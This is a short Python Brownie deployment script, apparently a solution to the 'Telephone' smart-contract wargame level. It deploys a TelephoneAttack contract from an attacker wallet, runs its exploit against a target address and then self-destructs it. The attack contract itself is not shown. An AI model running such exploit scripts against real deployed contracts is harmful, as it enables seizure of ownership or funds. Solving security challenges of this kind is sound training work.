from brownie import accounts, config, interface, web3, TelephoneAttack


def exploit(target, hacker):
    deploy_attack = TelephoneAttack.deploy(target, {"from": hacker})
    deploy_attack.exploit({'from': hacker, 'allow_revert': True})
    deploy_attack.destroy({'from': hacker})


def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    print(f'Attacker address: {hacker}, Target address: {target}')
    exploit(target, hacker)

